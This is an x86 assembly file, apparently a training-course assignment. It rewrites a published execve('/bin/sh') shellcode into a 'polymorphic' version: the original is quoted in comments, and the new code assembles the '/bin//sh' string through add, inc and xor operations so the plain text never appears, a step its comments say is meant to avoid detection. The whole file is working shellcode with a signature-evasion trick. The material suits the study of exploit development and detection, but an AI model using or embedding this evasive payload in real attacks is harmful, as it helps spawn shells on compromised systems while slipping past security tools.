; SLAE-xxx 
; assigmemnt 6.: polymorphic version of shellstorm shellcode 

; execve /bin/sh 
; http://shell-storm.org/shellcode/files/shellcode-827.php
; by Hamza Megahed 


;xor    %eax,%eax 
;push   %eax ; push 0 
;push   $0x68732f2f
;push   $0x6e69622f
;mov    %esp,%ebx 
;push   %eax ; push 0 
;push   %ebx ; 
;mov    %esp,%ecx
;mov    $0xb,%al
;int    $0x80

global _start

_start:


; ok we will try to avoid clear txt  "/bin/sh" 
;  into esi to avoid detection 
xor esi,esi;
mov edi,esi; 
; dec edi; register wraps around 
push esi; 
; push 0x68732f2f ; 
add esi,0x68732f2f; 
push esi;
; push 0x6e69622f ; "/bin" 
inc esi; avoid null byte xor 
xor esi,0x61a4d1f; XORed to get "/bin"  
push esi; 
mov ebx,esp; 
push edi; 
push ebx; 
mov ecx,esp ; 

; ok 
mov al,0xb 
int 0x80 

